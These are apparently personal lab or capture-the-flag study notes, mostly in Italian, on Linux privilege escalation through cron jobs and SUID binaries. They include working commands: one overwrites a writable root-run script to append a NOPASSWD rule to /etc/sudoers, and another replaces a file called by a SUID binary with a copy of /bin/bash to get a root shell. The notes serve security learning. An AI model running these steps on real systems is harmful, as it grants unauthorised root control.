#### Cron Jobs
```
#### Cron Jobs
Il mio obiettivo è poter diventare root, devo cercare dei file sul quale ho i permessi di write + execute + file o cron job task.

Listo cron Jobs task:
> crontab -l 

Oppure posso cercare un file che è eseguibile unicamente con i privilegi da root, ma che però è ricorrente in altri path con stesso nome, che potrebbe simboleggiare che quel file in /tmp va a fare l'override del file sul quale non ho accesso

> find / -name "*message*" 2>/dev/null -> Ottengo /tmp/message

Greppo per cercare file di shell che avranno come ouput quella cartella nel bash:
> grep -nri "/tmp/message" /usr -> Ottengo due file .sh in /usr/local/share/copy.sh

Sulla shell ho i permessi di scrittura, non ho un text editor sul systema quindi uso le echo/printf
> printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
> cat /usr/local/share/copy.sh
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers
> sudo -l
> sudo su
Got root priviledges
get the flag


```


#### SUID
SUID (Set User ID upon execution) è un tipo speciale di permessi dati a un file in sistemi Unix e Linux. Normalmente, quando un programma viene eseguito, eredita i permessi di accesso dall’utente che ha effettuato l’accesso. Tuttavia, con SUID, il programma viene eseguito con i privilegi del proprietario del file eseguibile1.

Ecco alcuni punti chiave riguardanti SUID:

Utilizzo di SUID:
Quando il bit SUID è impostato su un file eseguibile, significa che il file verrà eseguito con gli stessi privilegi del proprietario del file eseguibile.
Ad esempio, se un utente normale esegue un programma con SUID impostato da un utente con privilegi di amministratore, quel programma verrà eseguito con i privilegi di amministratore.

```
#### SUID

In order to elevate our privileges, we will need to identify an SUID binary that is owned by the "root" user.  
Uso SUID binary file al quale ho accesso, che utilizzano file o puntamenti es. welcome. Se alcuni du questi eseguono altri file es. greetings, posso creare un nuovo file greetings bash e sostuirlo al precedente. (-rw*s*r-xr-x)

Cerco bynary file che viene eseguito con il SUID, e cerco eventualmente file che vengono eseguiti all'interno, in modo da poter modificare quel file e lanciare comandi da lì.

> -rwsr-xr-x welcome
> file welcome
> strings welcome    > Trovo la word "greetings" e ipotizzo vada a lanciare quel file  

Cancello il file "greetings" e ne creo un'altro, con al suo interno il contenuto di /bin/bash (che permetterà di essere lanciato da root e spawnare una shell root):
> cp /bin/bash greetings
> ./welcome
> whoami -> root


```
